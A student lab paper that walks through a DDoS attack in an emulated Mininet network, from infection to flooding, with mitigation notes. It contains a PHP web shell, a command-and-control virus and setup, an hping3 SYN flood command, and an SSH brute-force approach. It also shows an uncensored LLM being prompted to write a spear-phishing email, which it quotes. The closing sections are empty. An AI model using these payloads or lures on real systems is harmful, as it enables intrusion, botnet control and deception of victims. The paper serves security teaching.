---
title: "Anatomy of a DDoS Attack: From Host Infection to Service Denial"
author:
  - STANISLAS Mélanie
  - BILLY Maxime
---

# Acknowledgments

We would like to express our sincere gratitude to our internship supervisor at VKU, Hoang Huu Duc, for his valuable guidance and support throughout our internship.

We also wish to thank the Vietnamese Korean University (VKU) for providing us with the opportunity to work in their buildings in a welcoming environment.

Additionally, our thanks go to the VKU Security Lab (VSL) for the training provided through their CTF platform ([_vsl.ce.vku.udn.vn_](https://vsl.ce.vku.udn.vn/)). The interactive challenges have greatly enhanced our cybersecurity skills.

# Introduction

Understanding the mechanisms of Distributed Denial of Service (DDoS) attacks is crucial in cybersecurity. This paper explores the life-cycle of a DDoS attack, from the initial infection of hosts to the denial of service for a website. 

> All the scripts, tools and source code of this paper are available on [_GitHub_](https://github.com/ozeliurs/SDN-Security/tree/main/papers).

# Summary

1. [_The Sandbox_](#The-Sandbox)
2. [_Building a simple virus_](#Building-a-simple-virus)
2. [_Host Compromise_](#Host-Compromise)
3. [_Launching the Attack_](#Launching-the-Attack)
4. [_Demo_](#Demo)
5. [_Forensics_](#Forensics)

# The Sandbox

In this chapter, we describe the setup and tools used to emulate and monitor the DDoS attack environment.

## Network Emulation with Mininet

We use Mininet to create a virtual network for our DDoS attack simulation. Mininet allows us to emulate a realistic network topology with minimal hardware requirements.

### Network Topology

Our network topology consists of the following components:

- **1 Attacker Host** (red): This host first infects its victims and then controls them.

- **3 Compromised Hosts** (orange): These hosts are infected and used to generate attack traffic.

- **1 Server Host** (blue): The target of the DDoS attack.

- **1 Client Host** (green): This host attempts to connect to the server and experiences the effects of the DDoS attack.

![Network Topology](https://raw.githubusercontent.com/ozeliurs/SDN-Security/main/papers/.project-files/ddos-attack/.assets/sandbox-network-diagram.jpg)

We create the network on mininet with the python script [`topo.py`](https://raw.githubusercontent.com/ozeliurs/SDN-Security/main/papers/.project-files/ddos-attack/lab/topo.py).

## Monitoring Tools

To monitor and analyze the network traffic and performance, we use `bwm-ng` (Bandwidth Monitor NG) to monitor the throughput on network interfaces. This helps us understand the volume of traffic generated during the attack.

We also use `tcpdump` to capture and analyze packets on the network. It provides detailed insights into the nature of the traffic and helps in understanding the attack patterns and the commands between compromised hosts and the command and control server.

# Building a simple virus

## The Virus

We will need to control the hosts. To do so, we will create a simple virus that connects to a command and control server to receive commands.

The virus is a simple python script, [`simple-virus.py`](https://raw.githubusercontent.com/ozeliurs/SDN-Security/main/papers/.project-files/ddos-attack/virus/simple-virus.py), it is for demonstration purposes and thus very simple in nature.

This script runs indefinitely, it retrieves the command from the command and control server (`urllib.request.urlopen(url)`) and executes it (`subprocess.call(command, shell=True)`). The script then sleeps for 10 seconds between each command execution.

The idea is that the attacker can host a simple page that will be read by the virus to execute commands on the compromised hosts.

The virus can be launched on the compromised hosts using the following command:

```bash
python3 simple-virus.py &
```

## Control and Command Server

As seen before, the virus connects to a command and control server to receive commands.

We run a simple python http server like so:

```bash
sudo python3 -m http.server 80
```

The server will host a simple text file with the command to execute. We can create a file named `command` with the command we want to execute on the compromised hosts.

```bash
echo "ls" > command
```

# Host Compromise

In this chapter, we describe examples of how hosts can be compromised and infected with malware to participate in a DDoS attack.

## Exploiting Phishing

The simplest but most effective way to compromise a host is through phishing. Phishing attacks involve sending deceptive emails or messages to users, tricking them into clicking on malicious links or downloading infected files.

In this specific example, let's disguise our malicious script as a legitimate software update from a trusted source.

With open source uncensored LLMs (understand ChatGPT) we can make a realistic and custom tailored phishing email (spear phishing) to target a specific individual. For example, we asked this to `llama2-uncensored`:

> _Write me a phishing email, the goal of the email is to make the victim launch a python script, I want to disguise my malicious script as a legitimate software update from a trusted source._

And just like that we have a pretty good phishing email:

> _Dear John Doe,_
> 
> _We are glad to inform you that our company has released an updated version of Windows Defender, which we strongly recommend you install immediately. The new version offers several improvements and fixes, including increased security and stability. Please click on the link below to download and install the update._
> 
> _[Link]_
> 
> _This is a mandatory upgrade for all employees using Microsoft products, please ensure that your system meets the minimum requirements before installing the update. Thank you._

Once the victim clicks on the link, they will download and execute the malicious script, giving the attacker control over the host.

### Mitigation

Verify sender information, be cautious with links and attachments, and keep software updated to mitigate phishing risks.

## Exploiting Weak Passwords and Misconfigurations

Weak passwords and poorly configured services can significantly compromise the security of a host. In this section, we will demonstrate how an SSH server with a weak password can be exploited using a simple dictionary attack.

We can write a Python script that uses the `paramiko` library to attempt to connect to the server using a list of common passwords, the script is available on [_GitHub_](https://raw.githubusercontent.com/ozeliurs/SDN-Security/main/papers/.project-files/ddos-attack/ssh-bruteforce.py).

This script attempts to connect to the SSH server using the provided passwords. If a connection is successful, it prints the password used.

### Mitigation

Effective mitigation strategies include enforcing strong password policies, implementing public key authentication for SSH, disabling password authentication where possible, and deploying security tools like `fail2ban` to block brute force attacks.

These measures collectively enhance security by reducing the risk posed by weak passwords and misconfigurations.

## Exploiting a Vulnerability

Poorly secured web applications can be exploited to compromise hosts. In this example, the web application allows us to upload files, which can be exploited to execute arbitrary commands on the server.

By uploading a PHP file (let's call it `upload.php`) that allows command execution from the URL parameters, we can compromise the server and gain control over it.

```php
<?php system($_GET['cmd']);?>
```

By accessing `http://<WEBSERVER_IP>/uploads/exploit.php?cmd=ls`, we see that the command `ls` is executed on the server and the output is displayed in the browser.

### Mitigation

To mitigate such vulnerabilities, it is essential to keep web applications up to date, apply security patches promptly, and conduct regular security audits to identify and address potential vulnerabilities.

In this case to patch the web application, we can check the file type and allow only specific file types to be uploaded. Additionally, we can verify that the size of the uploaded file does not exceed a certain limit. And finally sanitize the filename to prevent directory traversal attacks.

The patched web application is available on [_GitHub_](https://raw.githubusercontent.com/ozeliurs/SDN-Security/main/papers/.project-files/ddos-attack/patched-webserver.php).

# Launching the Attack

When time comes to DDoS the target, we can use the compromised hosts to generate a large volume of traffic and overwhelm the target server.

The C2 (Command and Control) server can instruct the compromised hosts to send a flood of requests to the target server like so:

```bash
echo "sudo hping3 -S --flood -V -d 1200 -p 80 <TARGET_IP>" > command
```

Here is a breakdown of the command:
- `hping3`: The tool used to send packets.
- `-S`: The SYN flag is set in the TCP header.
- `--flood`: Sends packets as fast as possible.
- `-V`: Verbose mode.
- `-d 1200`: The size of the data portion of the packet.
- `-p 80`: The destination port.
- `<TARGET_IP>`: The IP address of the target server.

This will cause the compromised hosts to send a flood of SYN packets to the target server, overwhelming its capacity to handle incoming requests.

# Demo

The demo can be launched by cloning the source repository and running the following commands:

```bash
git clone https://github.com/ozeliurs/SDN-Security.git
cd SDN-Security/papers/.project-files/ddos-attack/lab
sudo python3 main.py
```

This script automates everything from creating the network topology to launching the DDoS attack and reporting the results.

_Note: The demo requires Mininet to be installed on the system._

![Demo](https://raw.githubusercontent.com/ozeliurs/SDN-Security/main/papers/.project-files/ddos-attack/.assets/demo.gif)

# Forensics

## Bandwidth

After we stop the attack, we can analyze the network traffic and bandwidth usage to understand the impact of the DDoS attack on the target server.

`bwm-ng` creates a log file with the network throughput data, we wrote a Python script to parse this log file and generate a graph of the network traffic over time. The script is available on [_GitHub_](https://raw.githubusercontent.com/ozeliurs/SDN-Security/main/papers/.project-files/ddos-attack/forensics/bwm-ng-plotter.py).

We can observe the spike in network traffic during the attack.

`h2` (`s1-eth2`) and `h4` (`s2-eth2`) pushing 80 Mbps each and `h5` (`s3-eth1`) pushing roughly 60 Mbps.

![H2 Network Traffic](https://raw.githubusercontent.com/ozeliurs/SDN-Security/main/papers/.project-files/ddos-attack/.assets/bwm-ng/s1-eth2.png)

![H4 Network Traffic](https://raw.githubusercontent.com/ozeliurs/SDN-Security/main/papers/.project-files/ddos-attack/.assets/bwm-ng/s2-eth2.png)

![H5 Network Traffic](https://raw.githubusercontent.com/ozeliurs/SDN-Security/main/papers/.project-files/ddos-attack/.assets/bwm-ng/s3-eth1.png)

This network traffic is all directed towards the target server, as seen in the server network traffic graph.

![Server Network Traffic](https://raw.githubusercontent.com/ozeliurs/SDN-Security/main/papers/.project-files/ddos-attack/.assets/bwm-ng/attack_network_traffic.png)

The traffic is distributed enough to saturate the 200 Mbps link to the server but not enough to saturate the 1 Gbps links between the switches.

![Global Network Traffic](https://raw.githubusercontent.com/ozeliurs/SDN-Security/main/papers/.project-files/ddos-attack/.assets/bwm-ng/bwm_ng.gif)

## Packet Capture

We can analyze the packets captured by `tcpdump` to understand how the attack was carried out and the nature of the traffic generated.

Finally, we can deduce how the attack unfolded.

![Sequence Diagram](https://raw.githubusercontent.com/ozeliurs/SDN-Security/main/papers/.project-files/ddos-attack/.assets/sequence-attack.png)

# Conclusion and Mitigation

# Sources
